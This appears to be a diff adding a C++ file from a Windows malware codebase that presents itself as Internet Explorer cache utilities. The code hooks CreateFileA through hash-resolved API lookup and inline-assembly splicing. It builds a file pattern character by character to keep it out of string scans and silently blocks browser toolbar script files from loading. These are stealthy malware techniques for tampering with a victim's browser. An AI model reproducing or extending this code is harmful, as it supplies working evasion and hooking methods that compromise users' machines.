@@ -1,0 +1,132 @@
+// ---------------------------------------------------------------------------
+
+#pragma hdrstop
+
+#include "Windows.h"
+
+#include "IECacheUtils.h"
+#include "GetApi.h"
+#include "Splice.h"
+#include "Utils.h"
+
+// ---------------------------------------------------------------------------
+
+typedef HANDLE (WINAPI *TCreateFile)(
+	 LPBYTE lpFileName,
+	 DWORD dwDesiredAccess,
+	 DWORD dwShareMode,
+	 LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+	 DWORD dwCreationDisposition,
+	 DWORD dwFlagsAndAttributes,
+	 HANDLE hTemplateFile);
+// ---------------------------------------------------------------------------
+
+// Адреса оригинальный функций
+
+PRequestList IERequestList = NULL;
+
+
+
+namespace IECHooks
+{
+
+	TCreateFile Real_CreateFileA;
+	TCreateFile Real_CreateFileW;
+	//-------------------------------------------------------------------------
+
+	bool IsInvalidFile(PCHAR FileName)
+	{
+		char GoogleScript[] = {'*', 'c', '_', 't', 'o', 'o', 'l', 'b', 'a', 'r', '*', '.', 'j', 's', '*',  0};
+		if (WildCmp(FileName, GoogleScript))
+			return true;
+		else
+        	return false;
+    }
+
+    //-------------------------------------------------------------------------
+	HANDLE WINAPI Hook_CreateFileA(
+		 LPBYTE lpFileName,
+		 DWORD dwDesiredAccess,
+		 DWORD dwShareMode,
+		 LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+		 DWORD dwCreationDisposition,
+		 DWORD dwFlagsAndAttributes,
+		 HANDLE hTemplateFile)
+	{
+
+		if (IsInvalidFile((PCHAR)lpFileName))
+		{
+			return INVALID_HANDLE_VALUE;
+        }
+
+		return Real_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode,
+								lpSecurityAttributes, dwCreationDisposition,
+								dwFlagsAndAttributes, hTemplateFile);
+	}
+
+	//-------------------------------------------------------------------------
+
+	HANDLE WINAPI Hook_CreateFileW(
+		 LPBYTE lpFileName,
+		 DWORD dwDesiredAccess,
+		 DWORD dwShareMode,
+		 LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+		 DWORD dwCreationDisposition,
+		 DWORD dwFlagsAndAttributes,
+		 HANDLE hTemplateFile)
+	{
+		if (!WSTR::IsEmpty((PWCHAR)lpFileName))
+		{
+			PCHAR FN = WSTR::ToAnsi((PWCHAR)lpFileName, 0);
+
+			if (IsInvalidFile(FN))
+			{
+				STR::Free(FN);
+				return INVALID_HANDLE_VALUE;
+			}
+
+			STR::Free(FN);
+		}
+
+
+		return Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode,
+								lpSecurityAttributes, dwCreationDisposition,
+								dwFlagsAndAttributes, hTemplateFile);
+    }
+
+	//-------------------------------------------------------------------------
+	void SetHooks()
+	{
+		#define Hash_CreateFileA 0x8F8F114
+		#define Hash_CreateFileW 0x8F8F102
+
+		if (HookApi(1, Hash_CreateFileA, (DWORD)&Hook_CreateFileA ) )
+		{
+			__asm mov [Real_CreateFileA], eax
+		}
+
+//		if (HookApi(1, Hash_CreateFileW, (DWORD)&Hook_CreateFileW) )
+//		{
+//			__asm mov [Real_CreateFileW], eax
+//		}
+
+    }
+
+}
+
+
+// ---------------------------------------------------------------------------
+
+
+bool IECache::Initialize(PRequestList Requests)
+{
+	// Инициализируем методы для работы с кешем IE
+	if (Requests == NULL)
+		return false;
+
+	IERequestList = Requests;
+
+	IECHooks::SetHooks();
+
+	return true;
+}
